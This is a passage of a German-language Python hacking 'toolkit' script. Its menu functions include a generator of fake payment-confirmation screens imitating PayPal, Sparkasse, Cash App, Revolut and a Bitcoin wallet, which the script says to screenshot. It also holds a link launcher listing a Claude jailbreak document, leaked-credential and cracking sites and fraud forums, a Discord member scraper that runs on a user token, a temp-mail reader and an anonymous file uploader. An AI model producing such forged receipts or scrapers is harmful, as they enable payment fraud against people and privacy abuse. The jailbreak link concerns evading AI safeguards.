<div class="subtitle">Money is on the way to {recipient}</div>
<div class="amount">{curr_sym}{amount}.00</div>
<div class="currency">{currency}</div>
<div class="card">
<div class="person"><div class="avatar">{ini}</div><div class="person-info"><div class="name">{recipient}</div><div class="email">{recipient.lower().replace(' ','.')}@gmail.com</div></div></div>
</div>
<div class="card">
<div class="row"><span class="k">Payment method</span><span class="v">Visa •• 4829</span></div>
<div class="row"><span class="k">Fee</span><span class="v">0.00 {currency}</span></div>
<div class="row"><span class="k">Transaction ID</span><span class="v" style="font-family:monospace;font-size:12px">{ref}</span></div>
<div class="row"><span class="k">Date</span><span class="v">{tstamp}</span></div>
</div>
<div class="done">Done</div>
</div></body></html>"""

    elif style == "2":
        # Sparkasse App MOBILE
        iban = "DE" + "".join(random.choices(string.digits, k=20))
        formatted_iban = " ".join([iban[i:i+4] for i in range(0,len(iban),4)])
        html = f"""<!doctype html><html><head><meta charset="utf-8"><title>Sparkasse</title>{PHONE_WRAP}
<style>
.phone{{background:#f5f5f5}}
.header{{background:#ff0000;color:#fff;padding:14px 20px 20px}}
.header .top{{display:flex;align-items:center;gap:14px}}
.back{{font-size:22px}}
.hn{{font-weight:600;font-size:17px}}
.section{{background:#fff;margin:12px 16px;border-radius:14px;padding:18px;box-shadow:0 1px 4px rgba(0,0,0,.06)}}
.status-icon{{width:64px;height:64px;background:#e8f5e9;border-radius:50%;margin:20px auto 14px;display:flex;align-items:center;justify-content:center;color:#2e7d32;font-size:38px;font-weight:900}}
.title{{text-align:center;font-size:19px;font-weight:600;color:#000;margin-bottom:6px}}
.subtitle{{text-align:center;color:#666;font-size:14px;margin-bottom:20px}}
.amt-block{{text-align:center;padding:12px 0}}
.amt{{font-size:40px;font-weight:700;color:#ff0000}}
.amt-lbl{{color:#666;font-size:13px;margin-top:4px}}
.row{{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid #f2f2f2;font-size:14px}}
.row:last-child{{border:none}}
.k{{color:#666}}.v{{color:#000;font-weight:600;text-align:right}}
.iban{{font-family:'SF Mono',monospace;font-size:12px;color:#333}}
</style></head><body><div class="phone">
<div class="notch"></div>{STATUSBAR_LIGHT}
<div class="header"><div class="top"><span class="back">←</span><span class="hn">Überweisungs­details</span></div></div>
<div class="section">
<div class="status-icon">✓</div>
<div class="title">Überweisung erfolgreich</div>
<div class="subtitle">Ausgeführt am {now.strftime('%d.%m.%Y')}</div>
<div class="amt-block"><div class="amt">−{amount},00 €</div><div class="amt-lbl">Zahlung an</div></div>
</div>
<div class="section">
<div class="row"><span class="k">Empfänger</span><span class="v">{recipient}</span></div>
<div class="row"><span class="k">IBAN</span><span class="v iban">{formatted_iban}</span></div>
<div class="row"><span class="k">BIC</span><span class="v">SPKADEXXXXX</span></div>
<div class="row"><span class="k">Bank</span><span class="v">Sparkasse</span></div>
<div class="row"><span class="k">Verwendungszweck</span><span class="v">Zahlung</span></div>
<div class="row"><span class="k">Buchungsdatum</span><span class="v">{now.strftime('%d.%m.%Y')}</span></div>
<div class="row"><span class="k">Wertstellung</span><span class="v">{now.strftime('%d.%m.%Y')}</span></div>
</div>
</div></body></html>"""

    elif style == "3":
        # Cash App MOBILE
        cashtag = "$" + recipient.lower().replace(" ","")[:12]
        html = f"""<!doctype html><html><head><meta charset="utf-8"><title>Cash App</title>{PHONE_WRAP}
<style>
.phone.dark, .phone{{background:#00d64f}}
.phone.dark .statusbar,.statusbar{{color:#fff !important}}
.header{{color:#fff;padding:12px 24px;display:flex;align-items:center;justify-content:space-between}}
.back{{font-size:24px}}
.dots{{font-size:22px}}
.dollar{{font-size:120px;font-weight:900;color:#fff;text-align:center;margin:60px 0 20px;letter-spacing:-6px;line-height:1}}
.status-badge{{background:#fff;color:#00c845;padding:8px 20px;border-radius:24px;font-weight:700;font-size:15px;width:fit-content;margin:0 auto 12px;display:flex;align-items:center;gap:8px}}
.paid-to{{color:#fff;text-align:center;font-size:17px;margin-bottom:6px;opacity:.95}}
.person-name{{color:#fff;text-align:center;font-size:22px;font-weight:700;margin-bottom:60px}}
.section{{background:rgba(0,0,0,.14);margin:16px 20px;border-radius:14px;padding:18px 20px}}
.row{{display:flex;justify-content:space-between;padding:10px 0;color:#fff;font-size:14px}}
.k{{opacity:.85}}
.v{{font-weight:600}}
.done{{position:absolute;bottom:36px;left:24px;right:24px;background:#fff;color:#00c845;text-align:center;padding:16px;border-radius:32px;font-weight:700;font-size:17px}}
</style></head><body><div class="phone dark">
<div class="notch"></div>{STATUSBAR_DARK}
<div class="header"><span class="back">×</span><span>Payment</span><span class="dots">···</span></div>
<div class="dollar">{curr_sym}{amount}</div>
<div class="status-badge">✓ Paid</div>
<div class="paid-to">Paid to</div>
<div class="person-name">{recipient}<br><span style="font-size:14px;opacity:.8;font-weight:400">{cashtag}</span></div>
<div class="section">
<div class="row"><span class="k">Date</span><span class="v">{tstamp}</span></div>
<div class="row"><span class="k">From</span><span class="v">Cash Balance</span></div>
<div class="row"><span class="k">To</span><span class="v">{cashtag}</span></div>
<div class="row"><span class="k">Reference</span><span class="v" style="font-family:monospace;font-size:12px">#{ref[:8]}</span></div>
</div>
<div class="done">Done</div>
</div></body></html>"""

    elif style == "4":
        # Bitcoin MOBILE (BlockChain wallet)
        btc = round(float(amount) / 65000, 8)
        tx = "".join(random.choices("abcdef0123456789", k=64))
        html = f"""<!doctype html><html><head><meta charset="utf-8"><title>Bitcoin</title>{PHONE_WRAP}
<style>
.phone{{background:#0d1117;color:#c9d1d9}}
.phone .statusbar{{color:#fff !important}}
.header{{color:#fff;padding:12px 24px;display:flex;align-items:center;justify-content:space-between}}
.back{{font-size:22px}}
.title-hdr{{font-weight:600;font-size:16px}}
.btc-icon{{width:72px;height:72px;background:#f7931a;border-radius:50%;margin:36px auto 20px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:44px;font-weight:900}}
.tx-status{{text-align:center;color:#3fb950;font-size:15px;font-weight:600;margin-bottom:6px}}
.tx-status::before{{content:"● ";font-size:10px}}
.confirms{{text-align:center;color:#8b949e;font-size:13px;margin-bottom:24px}}
.amount-btc{{text-align:center;font-size:36px;font-weight:700;color:#fff;margin:8px 0}}
.amount-usd{{text-align:center;color:#8b949e;font-size:16px;margin-bottom:28px}}
.section{{background:#161b22;margin:12px 20px;border-radius:14px;padding:16px 20px;border:1px solid #21262d}}
.row{{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid #21262d;font-size:14px;align-items:flex-start;gap:12px}}
.row:last-child{{border:none}}
.k{{color:#8b949e;flex-shrink:0}}
.v{{color:#c9d1d9;font-weight:500;text-align:right;word-break:break-all}}
.tx-hash{{font-family:'SF Mono',monospace;font-size:11px;color:#58a6ff}}
</style></head><body><div class="phone">
<div class="notch"></div>{STATUSBAR_DARK}
<div class="header"><span class="back">←</span><span class="title-hdr">Transaction</span><span></span></div>
<div class="btc-icon">₿</div>
<div class="tx-status">Confirmed</div>
<div class="confirms">6 confirmations · Bitcoin</div>
<div class="amount-btc">− {btc} BTC</div>
<div class="amount-usd">≈ {curr_sym}{amount}.00 {currency}</div>
<div class="section">
<div class="row"><span class="k">To</span><span class="v tx-hash">bc1q{("".join(random.choices("023456789acdefghjklmnpqrstuvwxyz",k=38)))}</span></div>
<div class="row"><span class="k">Fee</span><span class="v">0.00001234 BTC</span></div>
<div class="row"><span class="k">Block</span><span class="v">#{random.randint(820000,830000)}</span></div>
<div class="row"><span class="k">Date</span><span class="v">{tstamp}</span></div>
</div>
<div class="section">
<div class="row"><span class="k">Transaction ID</span></div>
<div style="color:#58a6ff;font-family:monospace;font-size:11px;word-break:break-all;margin-top:4px">{tx}</div>
</div>
</div></body></html>"""

    elif style == "5":
        # Revolut MOBILE
        html = f"""<!doctype html><html><head><meta charset="utf-8"><title>Revolut</title>{PHONE_WRAP}
<style>
.phone{{background:#000}}
.phone .statusbar{{color:#fff !important}}
.header{{color:#fff;padding:12px 24px;display:flex;align-items:center;justify-content:space-between}}
.back{{font-size:24px;color:#fff}}
.check-block{{margin:60px auto 24px;width:100px;height:100px;background:#0666eb;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:52px;font-weight:900}}
.amt{{color:#fff;text-align:center;font-size:52px;font-weight:700;margin:12px 0}}
.subline{{text-align:center;color:#8a8a8f;font-size:15px;margin-bottom:8px}}
.person{{text-align:center;color:#fff;font-size:20px;font-weight:600;margin-bottom:60px}}
.section{{background:#1c1c1e;margin:8px 20px;border-radius:14px;padding:18px 20px}}
.row{{display:flex;justify-content:space-between;padding:10px 0;color:#fff;font-size:14px;border-bottom:1px solid #2c2c2e}}
.row:last-child{{border:none}}
.k{{color:#8a8a8f}}
.v{{font-weight:500}}
</style></head><body><div class="phone">
<div class="notch"></div>{STATUSBAR_DARK}
<div class="header"><span class="back">×</span><span style="color:#fff;font-weight:600">Transfer</span><span></span></div>
<div class="check-block">✓</div>
<div class="subline">Sent</div>
<div class="amt">{curr_sym}{amount}.00</div>
<div class="subline">to</div>
<div class="person">{recipient}</div>
<div class="section">
<div class="row"><span class="k">Status</span><span class="v" style="color:#00d47e">Completed</span></div>
<div class="row"><span class="k">Type</span><span class="v">Bank transfer</span></div>
<div class="row"><span class="k">Fee</span><span class="v">Free</span></div>
<div class="row"><span class="k">Reference</span><span class="v" style="font-family:monospace;font-size:12px">{ref[:12]}</span></div>
<div class="row"><span class="k">Date</span><span class="v">{tstamp}</span></div>
</div>
</div></body></html>"""

    else:
        # PayPal RECEIVED
        html = f"""<!doctype html><html><head><meta charset="utf-8"><title>PayPal</title>{PHONE_WRAP}
<style>
.phone{{background:#f5f7fa}}
.header{{background:#003087;color:#fff;padding:20px 24px 24px;display:flex;align-items:center;gap:14px}}
.back{{font-size:22px}}
.ppl{{font-weight:900;font-style:italic;font-size:24px}}.ppl .al{{color:#009cde}}
.check-circle{{width:96px;height:96px;background:linear-gradient(135deg,#00c853,#00e676);border-radius:50%;margin:36px auto 20px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:56px;font-weight:900;box-shadow:0 8px 24px rgba(0,200,83,.35)}}
.title{{text-align:center;font-size:20px;font-weight:600;color:#001c64;margin-bottom:6px}}
.subtitle{{text-align:center;color:#5a6b78;font-size:14px;padding:0 24px;margin-bottom:24px}}
.amount{{text-align:center;font-size:48px;font-weight:700;color:#00a651;margin:20px 0 8px}}
.amount::before{{content:"+"}}
.currency{{text-align:center;color:#5a6b78;font-size:14px;margin-bottom:20px}}
.card{{background:#fff;margin:16px 20px;border-radius:16px;padding:18px 20px;box-shadow:0 2px 8px rgba(0,0,0,.04)}}
.person{{display:flex;align-items:center;gap:14px;padding:8px 0}}
.avatar{{width:52px;height:52px;background:#0070ba;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:18px}}
.person-info .name{{font-weight:600;font-size:15px;color:#001c64}}
.person-info .lbl{{color:#5a6b78;font-size:13px;margin-top:2px}}
.row{{display:flex;justify-content:space-between;padding:14px 0;border-top:1px solid #f0f2f5;font-size:14px}}
.row:first-of-type{{border:none}}
.k{{color:#5a6b78}}.v{{color:#001c64;font-weight:600;text-align:right}}
</style></head><body><div class="phone">
<div class="notch"></div>{STATUSBAR_LIGHT}
<div class="header"><span class="back">←</span><div class="ppl">Pay<span class="al">Pal</span></div></div>
<div class="check-circle">✓</div>
<div class="title">You received money</div>
<div class="subtitle">{recipient} sent you money</div>
<div class="amount">{curr_sym}{amount}.00</div>
<div class="currency">{currency}</div>
<div class="card">
<div class="person"><div class="avatar">{ini}</div><div class="person-info"><div class="name">{recipient}</div><div class="lbl">Sender</div></div></div>
</div>
<div class="card">
<div class="row"><span class="k">Status</span><span class="v" style="color:#00a651">Completed</span></div>
<div class="row"><span class="k">Type</span><span class="v">Personal payment</span></div>
<div class="row"><span class="k">Fee</span><span class="v">0.00 {currency}</span></div>
<div class="row"><span class="k">Transaction ID</span><span class="v" style="font-family:monospace;font-size:12px">{ref}</span></div>
<div class="row"><span class="k">Date</span><span class="v">{tstamp}</span></div>
</div>
</div></body></html>"""

    fname = os.path.join(HITS_DIR, f"fake_payment_{int(time.time())}.html")
    with open(fname, "w", encoding="utf-8") as f: f.write(html)
    print(f"\n{G}{B}[+] Fake screenshot generiert:{RST}")
    print(f"   {Y}{fname}{RST}")
    print(f"\n{W}   → Öffne im browser, dann F11 (fullscreen) → screenshot machen{RST}")
    print(f"{W}   → Für perfektes ergebnis: mobile view (F12 → device toolbar){RST}")
    save_hit("fake_payments", f"{style} | {amount} | {recipient} | {fname}")

    if ask("\nJetzt im browser öffnen? (Y/n): ","y").lower() != "n":
        try: os.startfile(fname)
        except: pass
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ 24) QUICK LAUNCHER — geile websites schnell öffnen
# ═══════════════════════════════════════════════════════════════
LAUNCHER = {
    "⭐ LO's Bookmarks": [
        ("💜 LO's Discord Server (JOIN)", "https://discord.gg/yR2pp86p8b"),
        ("VirusTotal (file scan)", "https://www.virustotal.com/gui/home/upload"),
        ("YouTube", "https://www.youtube.com/"),
        ("10 Minute Mail", "https://10minutemail.one/de"),
        ("Claude Jailbreak Doc", "https://docs.google.com/document/d/1J3h3tsS3eIQ7hpmDeXq6c9Ea7cpN4WuY-xlCk4hWSpg/edit?tab=t.0"),
        ("TextArtify (banner gen)", "https://textartify.com/"),
    ],
    "🕵 OSINT / Recon": [
        ("HaveIBeenPwned (breach check)", "https://haveibeenpwned.com/"),
        ("Shodan (device search)", "https://www.shodan.io/"),
        ("Censys", "https://search.censys.io/"),
        ("URLScan.io", "https://urlscan.io/"),
        ("WHOIS Lookup (who.is)", "https://who.is/"),
        ("MXToolbox (DNS/email)", "https://mxtoolbox.com/"),
        ("Wayback Machine", "https://web.archive.org/"),
        ("OSINT Framework", "https://osintframework.com/"),
        ("Sherlock (username hunt)", "https://sherlock-project.github.io/"),
        ("Namechk (username avail)", "https://namechk.com/"),
        ("IPinfo.io", "https://ipinfo.io/"),
        ("EmailHippo", "https://tools.emailhippo.com/"),
        ("Grabify (IP grabber)", "https://grabify.link/"),
    ],
    "🛡 Malware / Analysis": [
        ("VirusTotal", "https://www.virustotal.com/"),
        ("Hybrid Analysis", "https://www.hybrid-analysis.com/"),
        ("Any.Run (sandbox)", "https://any.run/"),
        ("MalwareBazaar", "https://bazaar.abuse.ch/"),
        ("URLhaus", "https://urlhaus.abuse.ch/"),
        ("Joe Sandbox", "https://www.joesandbox.com/"),
    ],
    "🔐 Cracking / Passwords": [
        ("CrackStation (hash cracker)", "https://crackstation.net/"),
        ("Hashes.com", "https://hashes.com/en/decrypt/hash"),
        ("MD5Decrypt", "https://md5decrypt.net/"),
        ("Dehashed", "https://dehashed.com/"),
        ("LeakCheck", "https://leakcheck.io/"),
        ("SnusBase", "https://snusbase.com/"),
    ],
    "🔧 Utilities / Dev": [
        ("CyberChef (encode swiss army)", "https://gchq.github.io/CyberChef/"),
        ("Base64 Decode", "https://www.base64decode.org/"),
        ("Regex101", "https://regex101.com/"),
        ("JSON Formatter", "https://jsonformatter.org/"),
        ("RegExr", "https://regexr.com/"),
        ("DNSChecker", "https://dnschecker.org/"),
        ("Speedtest", "https://www.speedtest.net/"),
    ],
    "📧 Temp Mail / Anon": [
        ("10 Minute Mail", "https://10minutemail.one/de"),
        ("Guerrilla Mail", "https://www.guerrillamail.com/"),
        ("TempMail.org", "https://temp-mail.org/"),
        ("MailDrop", "https://maildrop.cc/"),
        ("Yopmail", "https://yopmail.com/"),
        ("Mailinator", "https://www.mailinator.com/"),
    ],
    "📁 Paste / Upload": [
        ("Pastebin", "https://pastebin.com/"),
        ("Hastebin", "https://hastebin.com/"),
        ("PrivateBin", "https://privatebin.net/"),
        ("Catbox (file host)", "https://catbox.moe/"),
        ("File.io", "https://file.io/"),
        ("ImgBB", "https://imgbb.com/"),
        ("Litterbox (temp files)", "https://litterbox.catbox.moe/"),
    ],
    "🎯 Exploits / CVE": [
        ("ExploitDB", "https://www.exploit-db.com/"),
        ("CVE Details", "https://www.cvedetails.com/"),
        ("NVD (NIST)", "https://nvd.nist.gov/"),
        ("Vulners", "https://vulners.com/"),
        ("PacketStorm", "https://packetstormsecurity.com/"),
        ("GitHub Advisory DB", "https://github.com/advisories"),
    ],
    "🎨 Design / Fun": [
        ("TextArtify (banner)", "https://textartify.com/"),
        ("PatorJK ASCII", "https://patorjk.com/software/taag/"),
        ("Emoji Kitchen", "https://emojikitchen.dev/"),
        ("QR Generator (Google)", "https://www.the-qrcode-generator.com/"),
        ("Coolors (palettes)", "https://coolors.co/"),
    ],
    "💬 Chat / Communities": [
        ("YouTube", "https://www.youtube.com/"),
        ("Discord", "https://discord.com/app"),
        ("Reddit /r/hacking", "https://www.reddit.com/r/hacking/"),
        ("Reddit /r/blackhat", "https://www.reddit.com/r/blackhat/"),
        ("HackForums", "https://hackforums.net/"),
        ("Cracked.io", "https://cracked.io/"),
        ("Nulled.to", "https://nulled.to/"),
    ],
    "🤖 AI Tools": [
        ("Claude Jailbreak Doc", "https://docs.google.com/document/d/1J3h3tsS3eIQ7hpmDeXq6c9Ea7cpN4WuY-xlCk4hWSpg/edit"),
        ("ChatGPT", "https://chat.openai.com/"),
        ("Claude", "https://claude.ai/"),
        ("Gemini", "https://gemini.google.com/"),
        ("Perplexity", "https://perplexity.ai/"),
        ("Ollama models", "https://ollama.com/library"),
    ],
}

def quick_launcher():
    import webbrowser
    # kategorien ohne emojis für sauberes alignment
    CAT_LABELS = {
        "⭐ LO's Bookmarks":      "LO's Bookmarks",
        "🕵 OSINT / Recon":       "OSINT / Recon",
        "🛡 Malware / Analysis":  "Malware / Analysis",
        "🔐 Cracking / Passwords":"Cracking / Passwords",
        "🔧 Utilities / Dev":     "Utilities / Dev",
        "📧 Temp Mail / Anon":    "Temp Mail / Anon",
        "📁 Paste / Upload":      "Paste / Upload",
        "🎯 Exploits / CVE":      "Exploits / CVE",
        "🎨 Design / Fun":        "Design / Fun",
        "💬 Chat / Communities":  "Chat / Communities",
        "🤖 AI Tools":            "AI Tools",
    }
    while True:
        clear(); print_banner()
        print(f"{M}{B}» Quick Launcher{RST}")
        print(f"{DIM}   websites im default browser öffnen{RST}\n")

        print(f"{DIM}  ┌─────────────────────────────────────────────────┐{RST}")
        cats = list(LAUNCHER.keys())
        for i, cat in enumerate(cats, 1):
            label = CAT_LABELS.get(cat, cat)
            n = len(LAUNCHER[cat])
            highlight = G+B if i == 1 else W
            line = f"  {C}{i:>2}){RST}  {highlight}{label:<28}{RST}{DIM}{n:>3} sites{RST}"
            print(f"{DIM}  │{RST}{line}")
        print(f"{DIM}  ├─────────────────────────────────────────────────┤{RST}")
        print(f"{DIM}  │{RST}  {C} a){RST}  {G}★ Alle LO-Bookmarks auf einmal öffnen{RST}")
        print(f"{DIM}  │{RST}  {R} 0){RST}  zurück")
        print(f"{DIM}  └─────────────────────────────────────────────────┘{RST}")
        c = ask("\n  Kategorie: ")
        if c == "0" or not c: return
        if c.lower() == "a":
            print()
            for name, url in LAUNCHER["⭐ LO's Bookmarks"]:
                print(f"  {G}[→]{RST} {W}{name}{RST}")
                webbrowser.open(url); time.sleep(0.3)
            pause(); continue
        try: cat = cats[int(c) - 1]
        except: continue

        while True:
            clear(); print_banner()
            label = CAT_LABELS.get(cat, cat)
            print(f"{M}{B}» {label}{RST}\n")
            sites = LAUNCHER[cat]
            print(f"{DIM}  ┌─────────────────────────────────────────────────────┐{RST}")
            for i, (name, url) in enumerate(sites, 1):
                name_short = name if len(name) <= 32 else name[:29] + "..."
                print(f"{DIM}  │{RST}  {C}{i:>2}){RST}  {W}{name_short:<34}{RST}")
                print(f"{DIM}  │{RST}       {DIM}{url[:52]}{RST}")
            print(f"{DIM}  ├─────────────────────────────────────────────────────┤{RST}")
            print(f"{DIM}  │{RST}  {C} a){RST}  {G}★ Alle sites dieser kategorie öffnen{RST}")
            print(f"{DIM}  │{RST}  {R} 0){RST}  zurück")
            print(f"{DIM}  └─────────────────────────────────────────────────────┘{RST}")
            s = ask("\n  Wahl: ")
            if s == "0" or not s: break
            if s.lower() == "a":
                print()
                for name, url in sites:
                    print(f"  {G}[→]{RST} {W}{name}{RST}")
                    webbrowser.open(url); time.sleep(0.3)
                pause(); continue
            try:
                name, url = sites[int(s) - 1]
                print(f"\n  {G}[→]{RST} öffne {W}{name}{RST}...")
                webbrowser.open(url); time.sleep(0.5)
            except: pass

# ═══════════════════════════════════════════════════════════════
# ★ 25) ASCII ART GENERATOR
# ═══════════════════════════════════════════════════════════════
def ascii_art():
    clear(); print_banner()
    print(f"{M}{B}» ASCII Art Generator{RST}\n")
    try:
        import pyfiglet
    except ImportError:
        print(f"{Y}[*] installiere pyfiglet...{RST}")
        try:
            subprocess.check_call([sys.executable,"-m","pip","install","pyfiglet"])
            import pyfiglet
        except: log("ERR","install failed",R); pause(); return

    text = ask("Text: ")
    if not text: return
    print(f"\n{C}Fonts:{RST}")
    fonts = ["standard","slant","banner3","big","block","doom","epic","larry3d",
             "lean","mini","script","shadow","small","smshadow","3-d","5lineoblique",
             "alphabet","bulbhead","chunky","cyberlarge","fraktur","goofy","graffiti",
             "isometric1","isometric2","isometric3","isometric4","letters","poison"]
    for i, f in enumerate(fonts, 1):
        print(f"  {C}{i:>2}){RST} {f}")
    print(f"  {C} a){RST} {G}Alle fonts durchzeigen{RST}")
    c = ask("\nWahl [1]: ","1")

    if c.lower() == "a":
        for f in fonts:
            try:
                art = pyfiglet.figlet_format(text, font=f)
                print(f"\n{DIM}─── {f} ───{RST}")
                print(f"{G}{art}{RST}")
                save_hit("ascii_art", f"[{f}]\n{art}")
            except: pass
        pause(); return

    try:
        font = fonts[int(c) - 1]
        art = pyfiglet.figlet_format(text, font=font)
        print(f"\n{G}{art}{RST}")
        save_hit("ascii_art", f"[{font}]\n{art}")
        # save to file
        fname = os.path.join(HITS_DIR, f"ascii_{int(time.time())}.txt")
        with open(fname, "w", encoding="utf-8") as f: f.write(art)
        print(f"{DIM}  → gespeichert in {fname}{RST}")
    except Exception as e: log("ERR", str(e), R)
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ 26) DISCORD SERVER SCRAPER (message-based, user token)
# ═══════════════════════════════════════════════════════════════
def discord_server_scraper():
    clear(); print_banner()
    print(f"{M}{B}» Discord Server Member Scraper{RST}")
    print(f"{W}   Scrapt alle unique user IDs aus channel messages.{RST}")
    print(f"{W}   Braucht user token + du musst im server sein.{RST}\n")

    token = ask("Dein Discord Token: ")
    if not token: return
    guild_id = ask("Server ID (rechtsklick server → ID kopieren): ")
    if not guild_id: return
    limit_channels = int(ask("Max channels durchsuchen [10]: ","10"))
    msgs_per = int(ask("Messages pro channel [500]: ","500"))

    headers = {"Authorization":token,"User-Agent":UA,
               "Content-Type":"application/json","X-Super-Properties":SUPER_PROPS}

    # get channels
    print(f"\n{Y}[*] hole channels...{RST}")
    try:
        r = requests.get(f"{DISCORD_API}/guilds/{guild_id}/channels", headers=headers, timeout=10)
        if r.status_code != 200:
            log("ERR", f"status {r.status_code}: {r.text[:150]}", R); pause(); return
        channels = [c for c in r.json() if c.get("type") in (0, 5)]  # text + announcement
    except Exception as e: log("ERR", str(e), R); pause(); return

    print(f"{G}[+] {len(channels)} text channels gefunden{RST}")
    channels = channels[:limit_channels]

    members = {}  # user_id → {username, discriminator, avatar, count}
    total_msgs = 0

    for ch in channels:
        cid = ch["id"]; cname = ch["name"]
        print(f"\n{C}[*] scrape #{cname}...{RST}")
        before = None
        fetched = 0
        while fetched < msgs_per:
            url = f"{DISCORD_API}/channels/{cid}/messages?limit=100"
            if before: url += f"&before={before}"
            try:
                r = requests.get(url, headers=headers, timeout=10)
                if r.status_code != 200:
                    if r.status_code == 403: print(f"  {DIM}[skip] no access{RST}"); break
                    print(f"  {R}[!] status {r.status_code}{RST}"); break
                data = r.json()
                if not data: break
                for msg in data:
                    a = msg.get("author", {})
                    uid = a.get("id")
                    if uid:
                        if uid not in members:
                            members[uid] = {
                                "username": a.get("username","?"),
                                "global_name": a.get("global_name",""),
                                "avatar": a.get("avatar",""),
                                "bot": a.get("bot", False),
                                "count": 0,
                            }
                        members[uid]["count"] += 1
                    total_msgs += 1
                fetched += len(data)
                before = data[-1]["id"]
                print(f"\r  {G}[✓] {fetched} messages | {len(members)} unique users{RST}", end="")
                time.sleep(0.6)  # ratelimit safety
                if len(data) < 100: break
            except Exception as e: print(f"\n  {R}[err] {e}{RST}"); break
        print()

    # save
    fname = os.path.join(HITS_DIR, f"discord_members_{guild_id}.csv")
    import csv
    with open(fname, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["user_id","username","global_name","bot","message_count","avatar_url"])
        for uid, m in sorted(members.items(), key=lambda x: -x[1]["count"]):
            avatar_url = f"https://cdn.discordapp.com/avatars/{uid}/{m['avatar']}.png" if m['avatar'] else ""
            w.writerow([uid, m["username"], m["global_name"], m["bot"], m["count"], avatar_url])

    print(f"\n{G}{B}=== DONE ==={RST}")
    print(f"{C}Messages gescannt: {RST}{total_msgs}")
    print(f"{C}Unique users:     {RST}{G}{B}{len(members)}{RST}")
    print(f"{C}Bots:             {RST}{sum(1 for m in members.values() if m['bot'])}")
    print(f"{C}Gespeichert:      {RST}{Y}{fname}{RST}")

    print(f"\n{C}Top 10 aktivste user:{RST}")
    top = sorted(members.items(), key=lambda x: -x[1]["count"])[:10]
    for uid, m in top:
        tag = f"{Y}[BOT]{RST} " if m["bot"] else ""
        print(f"  {tag}{G}{m['username']:<20}{RST} {C}{uid}{RST} ({m['count']} msgs)")
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ 27) JOIN ENI DISCORD (opens invite instantly)
# ═══════════════════════════════════════════════════════════════
def join_discord():
    import webbrowser
    clear(); print_banner()
    print(f"{M}{B}» LO's Discord Server{RST}\n")
    invite = "https://discord.gg/yR2pp86p8b"
    print(f"{G}{B}   💜 Öffne Discord...{RST}\n")
    print(f"{C}   Invite:{RST} {Y}{invite}{RST}")
    print(f"{C}   Falls sich Discord nicht öffnet, klick den link oben.{RST}")
    webbrowser.open(invite)
    time.sleep(1)
    print(f"\n{G}   [✓] Browser sollte jetzt offen sein{RST}")
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ 28) TEMP MAIL — erstellt + liest inbox live
# ═══════════════════════════════════════════════════════════════
def temp_mail():
    clear(); print_banner()
    print(f"{M}{B}» Temp Mail — 1secmail API{RST}\n")
    # get random address
    try:
        r = requests.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1", timeout=10).json()
        addr = r[0]
    except Exception as e:
        log("ERR", str(e), R); pause(); return
    user, domain = addr.split("@")
    print(f"{G}{B}   📧 Deine temp mail:{RST}")
    print(f"   {Y}{B}{addr}{RST}\n")
    print(f"{DIM}   → nutze diese addresse für signups{RST}")
    print(f"{DIM}   → hier drin siehst du live die eingehenden mails{RST}")
    print(f"{C}[waiting for mails — STRG+C = stop]{RST}\n")
    seen = set()
    try:
        while True:
            try:
                msgs = requests.get(f"https://www.1secmail.com/api/v1/?action=getMessages&login={user}&domain={domain}", timeout=10).json()
                for m in msgs:
                    mid = m["id"]
                    if mid in seen: continue
                    seen.add(mid)
                    full = requests.get(f"https://www.1secmail.com/api/v1/?action=readMessage&login={user}&domain={domain}&id={mid}", timeout=10).json()
                    print(f"\n{G}{B}╔══ NEUE MAIL #{len(seen)} ══════════════════════╗{RST}")
                    print(f"  {C}Von:{RST}       {Y}{full.get('from')}{RST}")
                    print(f"  {C}Betreff:{RST}   {W}{B}{full.get('subject')}{RST}")
                    print(f"  {C}Datum:{RST}     {DIM}{full.get('date')}{RST}")
                    print(f"  {C}Text:{RST}")
                    body = full.get("textBody") or full.get("body") or ""
                    for line in body.strip().split("\n")[:15]:
                        print(f"    {DIM}│{RST} {line[:80]}")
                    # find login codes/links
                    import re as _re
                    codes = _re.findall(r'\b\d{4,8}\b', body)
                    links = _re.findall(r'https?://\S+', body)
                    if codes: print(f"  {C}Codes gefunden:{RST} {G}{B}{', '.join(codes[:5])}{RST}")
                    if links: print(f"  {C}Links gefunden:{RST}")
                    for l in links[:3]: print(f"    {G}→ {l[:100]}{RST}")
                    print(f"{G}{B}╚═══════════════════════════════════════╝{RST}")
                    save_hit("temp_mails", f"{addr} | {full.get('from')} | {full.get('subject')}")
            except: pass
            time.sleep(5)
    except KeyboardInterrupt:
        print(f"\n{Y}[!] {len(seen)} mails erhalten{RST}"); pause()

# ═══════════════════════════════════════════════════════════════
# ★ 29) FILE UPLOAD (catbox) — anonymer file share
# ═══════════════════════════════════════════════════════════════
def file_upload():
    clear(); print_banner()
    print(f"{M}{B}» Anonymous File Upload — catbox.moe{RST}")
    print(f"{W}   Upload jede datei, kriegst nen permanent link zurück.{RST}\n")
    path = ask("Pfad zur datei: ").strip('"')
    if not os.path.exists(path):
        log("ERR", "nicht gefunden", R); pause(); return
    size = os.path.getsize(path)
    print(f"\n{C}File:{RST} {W}{os.path.basename(path)}{RST}")
    print(f"{C}Size:{RST} {W}{size:,} bytes ({size/1024/1024:.2f} MB){RST}")
    if size > 200*1024*1024:
        log("ERR", "max 200MB", R); pause(); return
    print(f"\n{Y}[*] uploading...{RST}")
    try:
        with open(path, "rb") as f:
            r = requests.post("https://catbox.moe/user/api.php",
                files={"reqtype":(None,"fileupload"),"fileToUpload":(os.path.basename(path), f)},
                timeout=300)
        if r.status_code == 200 and r.text.startswith("https://"):
            url = r.text.strip()
            print(f"\n{G}{B}[+] URL:{RST} {Y}{B}{url}{RST}")
            save_hit("uploaded_files", f"{path} → {url}")
        else: log("ERR", r.text[:150], R)
    except Exception as e: log("ERR", str(e), R)
    pause()

# ═══════════════════════════════════════════════════════════════
# ★ 30) YOUTUBE VIDEO INFO
